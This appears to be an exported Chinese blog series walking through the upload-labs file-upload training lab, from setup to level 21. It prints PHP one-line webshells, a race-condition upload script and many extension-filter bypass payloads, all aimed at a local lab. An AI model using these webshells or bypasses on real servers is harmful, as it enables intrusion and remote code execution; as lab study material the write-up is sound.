<h1 id="upload-labs配置"><a href="#upload-labs配置" class="headerlink" title="upload-labs配置"></a>upload-labs配置</h1><p>官方地址：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a><br>按照提示进行即可。<br>推荐的PHP5.2.117，PHP官方已经没有下载地址了，所以我们可以另找一个。<br><a href="https://www.cnblogs.com/endv/p/7743472.html">PHP5.2.17下载链接</a><br>选择其中的php-5.2.17-nts-Win32.zip下载即可。<br>解压后，把php.ini-recommended改成php.ini<br>然后把解压后的所有文件放在phpstudy的PHP目录下(默认安装了phpstudy)，这样就完成了。<br>如果Windows，点击下载地址链接，选择其中的Source code下载即可（有phpstudy的话）。<br>将其转移到phpstudy下的WWW目录，把upload-labs-masters目录名改为upload-labs。<br>并在其下建立一个upload，作为其存放上传文件的目录。<br>网站测试：<br>启动phpstudy，网页输入：127.0.0.1&#x2F;upload-labs<br>如果成功显示正常页面就基本没问题了。</p>
]]></content>
      <categories>
        <category>upload-labs</category>
        <category>蚁剑</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>upload-labs</tag>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_1</title>
    <url>/2022/11/23/upload-labs_1/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为上传漏洞的第一关，啥都没了解就开始做还是遇到了一些障碍。</p>
<span id="more"></span>
<h1 id="upload的大致思路图"><a href="#upload的大致思路图" class="headerlink" title="upload的大致思路图"></a>upload的大致思路图</h1><p><img src="/simg/upload-labs_1.png" alt=" "></p>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol>
<li><p>测试<br>看到任务，是上传一个webshell到服务器。<br>首先尝试上传，选择png文件，上传成功<br>然后选择txt文件，出现报错，显示只能上传jpg,png,gif的文件。<br>于是我们可以先把想要上传的文件改为允许类型，再抓包改文件后缀，实现shell的上传。</p>
</li>
<li><p>尝试与抓包<br>把写有 <code>&lt;?php phpinfo(); ?&gt;</code> 代码的txt文件改文件名为a.png。<br>提交后burp抓包，得到包的内容后，把包里的所有png改为php，之后放包，我们就可以看到文件上传成功了。<br>再打开网址测试 <code>127.0.0.1/upload-labs/upload/a.php</code><br>页面显示成功，那么说明我们的思路没问题。</p>
</li>
<li><p>上传webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(); @eval($_POST[&#x27;shell&#x27;]); ?&gt;   写入到b.txt</span><br><span class="line">将文件后缀改为png</span><br></pre></td></tr></table></figure>
<p>和上一个步骤一样，上传文件。<br>然后测试 <code>127.0.0.1/upload-labs/upload/b.php</code><br>显示成功。<br>我们可以打开蚁剑。点击鼠标右键-&gt;添加数据<br>“URL地址”填写测试的地址，连接密码自己任意设定。如果不放心，点右上角的“测试连接”，成功代表无问题，最后左上角“添加”。<br>创建成功后，右键点击我们创建的这条数据，再点“虚拟终端”，输入dir可看到目录中存在我们的php文件。</p>
</li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><p>由于白名单函数是在JavaScript中运行，所以可以禁用或修改JavaScript来关闭白名单，这样就可以直接把目标文件上传到服务器。<br>比如在Firefox中打开about:config，然后搜索javascript.enabled  默认是true，即使用JavaScript。可以修改为false禁用。<br>或者按F12，修改白名单的源码保存。（不推荐，实际用处不大）</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>曲曲折折走了些弯路，幸好最后成功了，不过先看点教学视频也许会上手更快。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Xionghuimin/article/details/106506988#:~:text=%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%89%93%E5%BC%80%20%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%20%EF%BC%8C%E5%A2%9E%E5%8A%A0%20%E6%95%B0%E6%8D%AE%20%EF%BC%8C%E7%84%B6%E5%90%8E%E5%A1%AB%E5%86%99URL%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%A1%AB%E5%86%99%E8%87%AA%E5%B7%B1%E7%9A%84%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,%E5%80%BC%20%E4%B8%BA%E7%A9%BA%20%EF%BC%8C%E4%B8%8D%E8%A6%81%E7%9D%80%E6%80%A5%EF%BC%8C%E5%8F%AA%E8%A6%81%E4%BD%A0%E5%A6%82%E4%B8%8B%E5%A1%AB%E5%86%99%E5%B0%B1%E8%A1%8C%E3%80%82%20%E5%89%8D%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%E7%9A%84IP%20%E5%9C%B0%E5%9D%80%20%EF%BC%8C%E5%90%8E%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%20%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%20%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%82">文件上传漏洞—蚁剑连接地址错误、一句话木马php语法错误</a><br><a href="https://blog.csdn.net/hexiaan/article/details/127054253">upload-labs Pass-01</a><br><a href="https://blog.csdn.net/wo41ge/article/details/107313203">upload-labs 21关大合集</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_11-16</title>
    <url>/2022/11/26/upload-labs_11-16/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在sqli-labs中类似的绕过</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第11关"><a href="#第11关" class="headerlink" title="第11关"></a>第11关</h2><p>抓包将后缀名改成双写即可绕过，即1.pphphp<br>成功绕过</p>
<h2 id="第12关"><a href="#第12关" class="headerlink" title="第12关"></a>第12关</h2><p>抓包后，在save_path处修改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../upload/b.php%00    通过%00截断的方式强行上传</span><br></pre></td></tr></table></figure>
<p>同时将file_name改为b.png<br>成功绕过</p>
<h2 id="第13关"><a href="#第13关" class="headerlink" title="第13关"></a>第13关</h2><p>先上传一个php文件，发现显示报错，那么是白名单模式<br>我们再上传一次抓包，然后发现是POST请求，那么就可以通过截断方式<br>首先，将b.php改为b.png<br>然后，将save_path处的路径改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../upload/b.php (最后有一个空格)</span><br></pre></td></tr></table></figure>
<p>将这个空格在Hex中从20改为00<br>最后放包。<br>成功绕过</p>
<h2 id="第14关"><a href="#第14关" class="headerlink" title="第14关"></a>第14关</h2><p>这道题主要检测的是文件头，我们上传的所有文件都会被转化为图片格式，我们需要上传一句话图片木马，如下图，将文件后缀改为php上传成功，但返回的为jpg格式文件。<br>这道题需要使用图片一句话木马。那么首先我们需要做一个出来。<br>在目录下，放一张b.jpg图片，再放一个b.php文件。然后在该目录下输入cmd命令，输入以下指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy b.jpg/b+b.php/a b.jpg</span><br></pre></td></tr></table></figure>
<p>然后再把文件上传<br>之后打开页面的“文件包含漏洞”链接。然后在地址栏后输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=upload/7920221126210455.jpg   数字是该文件上传后具有的</span><br></pre></td></tr></table></figure>
<p>成功绕过</p>
<h2 id="第15关"><a href="#第15关" class="headerlink" title="第15关"></a>第15关</h2><p>源码中出现了getimagesize函数。<br>getimagesize — 取得图像大小。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 false 并产生一条 E_WARNING 级的错误。<br>因为我们上传的的确是一张图片，所以可以使用和第14关的方法。<br>成功绕过</p>
<h2 id="第16关"><a href="#第16关" class="headerlink" title="第16关"></a>第16关</h2><p>操作和前2关是一样的。<br>但这里需要打开php.ini文件里的php_exif.dll，如果打开后找不到，尝试更换PHP版本。<br>成功绕过</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实难度相对简单，这几关和编程关联并不大，只是需要知道应该怎么做。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a><br><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_17</title>
    <url>/2022/11/26/upload-labs_17/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从17关开始，就变得有挑战性了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第17关"><a href="#第17关" class="headerlink" title="第17关"></a>第17关</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>imagecreatefromjpeg — 由文件或 URL 创建一个新图象<br>imagecreatefromjpeg() 返回一图像标识符，代表了从给定的文件名取得的图像<br>二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符&#x2F;图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。<br>按照原来的方法进行上传，我们可以发现还是可以上传的，但是配合包含漏洞却无法解析，这时我们把上传的图片复制下来用Notepad++打开，发现我们原来写的php代码没有了，这就是二次渲染把我们里面的php代码删掉了。<br>注意，使用Notepad++查看16进制需要安装一个插件：HEX-Editor<br>安装方法：打开Notepad++，在主页面上方找到（插件），然后（插件管理），在可用下搜索 Hex，下载即可。<br>使用方法：打开目标文件，找到（插件）-&gt; Hex-Editor -&gt; View in HEX<br>把原图和它修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。<br>具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的，知道怎么解就可以了。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不要只是按照操作，多想想原理。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/qq_46527080/article/details/111701067">upload-labs17关</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_18+19</title>
    <url>/2022/11/27/upload-labs_18+19/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关burp发挥的作用很大</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这一关的提示是代码审计，通过尝试，可以发现，是白名单验证的方式。<br>代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。<br>那么我们的方法是：尝试使用竞争条件上传，用burp一直上传文件，用python脚本一直方位临时文件，临时文件内容为我们写入一句话到它的目录。<br>其中python脚本如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">            test = requests.get(<span class="string">&quot;http://192.168.44.129:9096/upload/upload/success.php&quot;</span>)         //写入上传位置路径地址</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;260ca9dd8a4577fc00b7bd5810298076&quot;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>上传的文件内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(success);</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_REQUEST[123])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>用burp抓包-&gt;发送到Intruder<br><img src="/simg/upload-labs_18.png" alt=" "><br>Intruder中-&gt;Payloads  修改为如图所示<br><img src="/simg/upload-labs_18_2.png" alt=" "><br>最后同时运行python脚本和burp的start attack<br>则运行成功。</p>
<h2 id="第19关"><a href="#第19关" class="headerlink" title="第19关"></a>第19关</h2><p>也是和18关原理相同</p>
<p>这2关可以参考这个博客的另一个方法<br><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">17,18</a></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我自己觉得这两关是完成的不太好的，有各种各样的因素，以后再来补充吧~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>burp</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_2</title>
    <url>/2022/11/24/upload-labs_2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关难度也不大，只是涉及到了新的知识点。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试<br>首先可以尝试传输文件。<br>当我传输一个txt文件时，提示类型错误，但这次和第一关不同，不是弹窗，而是页面直接提示，因此不是前端JavaScript验证。<br>这时我们查看源码，可以看到下面这一段：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>从这段代码可以看出，上传文件的途中验证了content-type，并且固定了上传文件类型。这里涉及到了MIME。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br>语法：<br>type&#x2F;subtype<br>用法：<br>客户端：<br>告诉服务端上传文件类型<br>告诉服务端可以接受文件类型<br>服务端：<br>告诉客户端响应数据类型<br>详细参见：<a href="https://www.runoob.com/http/mime-types.html">MIME 类型</a><br>因此可以通过改变content-type来让目标文件上传成功</p>
</li>
<li><p>尝试与抓包<br>burp抓包，将content-type更改为image&#x2F;png，然后放包，我们就看到文件上传成功了。<br>然后打开，显示没问题，最终成功！</p>
</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，没什么难度。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_20</title>
    <url>/2022/11/27/upload-labs_20/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关要轻松一些了</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h2><p>截断move_uploaded_file()函数中的img_path是由post参数save_name控制的，可以在save_name利用%00截断(注意php版本低于5.3)<br>具体实现是，上传文件为图片马，将保存文件的名称后缀修改为.php 注意最后有一个空格<br>然后抓包，在Hex里修改空格20为00<br>可以看到上传成功，蚁剑连接也成功</p>
<h2 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h2><p>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 &#x2F;.<br>所以可以抓包，然后在保存文件末尾用&#x2F;.<br>这样我们可以看到，文件同样上传成功，蚁剑也连接成功</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一关的方法要简单一些了，但只是学会了方法，背后的原理仍需掌握。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_21</title>
    <url>/2022/11/27/upload-labs_21/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关用到的是数组绕过</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这道题需要代码审计，通过审计发现，先检查文件类型，后检查是否上传了文件名没有则为文件的名字，判断是否为数组，若不是则以点分割返回一个数组，取数组最后一位数为后缀，文件保存为reset输出数组第一个数，和最后一位数保存。</p>
<p>具体实现：<br>上传图片马文件，然后保存文件后缀改为php<br>之后抓包，然后如下图所示修改<br><img src="/simg/upload-labs_21.png" alt=" "><br>最后放包，就上传成功了，蚁剑也连接成功</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不仅要会方法，还要懂原理。通过这21关的训练，其实可以发现，白名单比黑名单安全性更高。<br>实战需要自己测试！</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_3</title>
    <url>/2022/11/24/upload-labs_3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>稍微改改就好，就像化了个妆人就认不出了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试<br>首先上传一个php文件，发现失败，显示信息为“提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！”<br>我们可以通过这个错误提示信息看出是黑名单，于是查看源码验证<br>通过源码，可以发现直接进行后缀名过滤，同时删除点，检查大小写去除字符串和空格。<br>但我们注意后缀名过滤的这行代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br></pre></td></tr></table></figure>
可以发现并没有过滤完全，因此我们可以通过更改等价后缀名的方式绕过。<br>那么接下来就是查看有哪些等价后缀名：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语言   等价扩展名</span><br><span class="line">asp    asa, cer, cdx</span><br><span class="line">aspx   ashx, asmx, ascx</span><br><span class="line">php    php2, php3, php4, php5, phps, phtml</span><br><span class="line">jsp    jspx, jspf</span><br></pre></td></tr></table></figure>
我们只需要把后缀名改成这些即可。<br>注意，因为默认Apache只解析少数几种后缀格式，所以最好到相应的httpd.conf文件下添加以下语句：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php5 .php3</span><br></pre></td></tr></table></figure>
意即能够解析<br>AddType 指令 作用：在给定的文件扩展名与特定的内容类型之间建立映射 语法：AddType MIME-type extension<br>[extension] …<br>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。<br>AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。</li>
</ol>
<h2 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h2><ol start="2">
<li>尝试与抓包<br>将文件后缀改为黑名单以外的后缀格式，即可顺利上传。或者通过抓包改后缀名。蚁剑顺利连接</li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><ol start="2">
<li>尝试与抓包<br>上传文件后缀名依旧是php，但通过burp抓包，然后修改filename，采用双写绕过。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php::$DA::$DATATA</span><br></pre></td></tr></table></figure>
这样就能够顺利上传，放到网页上，删除最后的::$data，网页正常打开。再在蚁剑上建立连接，非常顺利。</li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天在这一关弄了好久，起因却是一个有点儿离谱的原因。网页能打开，蚁剑却连不上。最后才发现，变量名就是密码，我第一关阴差阳错地对了。但我不知道密码要设为变量名，这一关也是随便一个密码，却一直过不了。最终发现是蚁剑的密码和文件内的变量名不同，谨记。<br>下次尽量避开这种失误。</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_4</title>
    <url>/2022/11/24/upload-labs_4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>改变能够改变的，选择能够选择的。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试<br>通过查看源码，我们可以发现，后缀名绕过已经行不通，因此我们需要更换思路。<br>可以尝试用.htaccess绕过。这里涉及到了.htaccess的知识。<br>‘.htaccess’文件相当于一种部分配置文件，好比局部变量一样，只在当前目录生效。比如你设置解析’.txt’解析为’.php’，那么’.htaccess’文件在的子目录中就会执行，而上一级目录不执行。<br>因此可以把目标文件后缀名改为.png，改Apache配置文件httpd.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line"></span><br><span class="line">LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so</span><br></pre></td></tr></table></figure>
<p>在该目录下创建.htaccess文件，然后写入如下代码，使得解析时将.jpg解析为.php格式。</p>
<figure class="highlight h"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;b.jpg&quot;</span>&gt;                      <span class="comment">//如果匹配到名为 b.jpg 的文件 就执行该文件</span></span><br><span class="line">       SetHandler  application/x-httpd-php             <span class="comment">//把文件当成php的代码来解析</span></span><br><span class="line">&lt;/FilesMatch&gt;       </span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>上传并尝试执行<br>上传成功，之后蚁剑连接失败。<br>是phpstudy集成环境中 php 的问题<br>因为在小皮面板中php版本是nts意思是即非线程安全，不提供数据访问保护，不支持使用 .htaccess</p>
</li>
</ol>
]]></content>
      <categories>
        <category>upload-labs</category>
      </categories>
      <tags>
        <tag>upload-labs</tag>
        <tag>蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs_5-10</title>
    <url>/2022/11/25/upload-labs_5-10/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚翻过了一座山，又遇到了一条河。bug的问题真伤脑筋…<br>这三关比较像，所以一起写了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h2><p><strong>黑名单过滤（后缀名特殊字符多写）</strong><br>尝试其它都无法成功，因此选择特殊字符重写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php. .         在php后加一个点，加一个空格，再加一个点，上传成功</span><br></pre></td></tr></table></figure>
<p>蚁剑按正常后缀连接成功。</p>
<h2 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h2><p><strong>黑名单过滤（大小写绕过）</strong><br>尝试其它都无法成功，因此选择大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.Php            任意改变php的大小写，上传成功</span><br></pre></td></tr></table></figure>
<p>正常情况下，蚁剑按正常后缀连接成功<br>PS: 我的出问题了，文件能上传，但打开文件时会出现HTTP500错误，没有找到原因，只能重装phpstudy解决</p>
<h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><p><strong>黑名单过滤（空格绕过）</strong><br>尝试其它都无法成功，因此选择空格绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php            在php后加一个空格，上传成功</span><br></pre></td></tr></table></figure>
<p>蚁剑按正常后缀连接成功</p>
<h2 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h2><p><strong>黑名单过滤（点绕过）</strong><br>尝试其它都无法成功，因此选择点绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b.php.          在php后加一个点，上传成功</span><br></pre></td></tr></table></figure>
<p>蚁剑按正常后缀连接成功</p>
